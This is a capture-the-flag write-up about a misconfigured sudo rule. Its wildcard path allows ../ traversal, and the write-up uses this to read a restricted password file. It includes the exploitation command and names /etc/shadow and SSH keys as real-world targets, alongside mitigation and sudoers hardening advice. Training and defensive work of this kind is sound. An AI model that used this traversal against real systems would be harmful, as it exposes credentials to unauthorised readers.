# sudo - weak configuration

`App - Script` • `Very Easy` • `5 pts`

## TL;DR

Path traversal in misconfigured sudo rule. Wildcard in file path allows escaping intended directory using `../` to read arbitrary files.

**Flag:** ✓ (validated)

---

## Challenge Description

> The administrator simplified their work without thinking about side effects...

**Context:** Privilege escalation through misconfigured sudo permissions allowing path traversal.

---

## Recon

**Check sudo privileges:**
```bash
$ sudo -l
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

**Vulnerability analysis:**
- Rule allows running `/bin/cat` as `app-script-ch1-cracked` user
- Target path: `/challenge/app-script/ch1/notes/*`
- **Critical flaw:** Wildcard `*` combined with relative path resolution

**Enumerate target information:**
```bash
$ cat readme.md
# Password location: /challenge/app-script/ch1/ch1cracked/.passwd
```

**Directory structure:**
```
/challenge/app-script/ch1/
├── notes/          ← Intended access zone
├── ch1cracked/
│   └── .passwd     ← Target file
```

---

## Exploitation

### Attack Vector: Path Traversal

The wildcard doesn't prevent directory traversal sequences (`../`).

**Exploitation command:**
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

**Step-by-step breakdown:**
1. `sudo -u app-script-ch1-cracked` → Execute as target user
2. `/bin/cat` → Allowed command (absolute path)
3. `/challenge/app-script/ch1/notes/` → Matches sudo rule prefix
4. `../` → Navigate up one directory
5. `ch1cracked/.passwd` → Access restricted file

**Result:** Successfully read password file outside intended `notes/` directory.

---

## Impact & Mitigation

### Real-World Implications
- **CWE-23**: Relative Path Traversal
- **CWE-misconfiguration**: Insecure sudo rules
- **MITRE ATT&CK T1548.003**: Abuse Elevation Control Mechanism (Sudo)

**Attack scenarios:**
- Read sensitive files (`/etc/shadow`, SSH keys, application secrets)
- Escalate privileges through configuration exposure
- Bypass file access restrictions in enterprise environments

### Secure sudo Configuration

| Vulnerable             | Secure                       |
|------------------------|------------------------------|
| `/path/to/dir/*`       | `/path/to/dir/specific_file` |
| Allows `../` traversal | Absolute path, no wildcards  |
|-------------------------------------------------------|
|Use `NOEXEC` tag when possible                         | 

**Proper sudoers syntax:**
```bash
# Bad:
user ALL=(target) /bin/cat /app/notes/*

# Good:
user ALL=(target) /bin/cat /app/notes/allowed_file.txt

# Better (with constraints):
user ALL=(target) NOEXEC: /usr/local/bin/safe_cat_wrapper
```

**Additional hardening:**
- Use `sudoedit` for file editing instead of arbitrary commands
- Implement whitelisting with exact paths
- Audit sudo logs regularly (`/var/log/auth.log`)

---

## Key Takeaways

**Technical Skills:**
- Identified sudo misconfiguration through `sudo -l` enumeration
- Exploited path traversal in command whitelist
- Understood file system navigation and relative path resolution

**Security Concepts:**
- **Wildcards in security contexts**: Extremely dangerous when combined with file paths
- **Defense in depth**: Single misconfiguration can bypass entire security model
- **Principle of least privilege**: Grant exact permissions needed, nothing more

**Penetration Testing Workflow:**
1. Always run `sudo -l` during privilege escalation enumeration
2. Look for wildcards, relative paths, or broad command permissions
3. Test path traversal sequences when file paths are involved

**Blue Team Perspective:** Use tools like `sudo-parser` or manual audits to detect dangerous patterns in `/etc/sudoers`.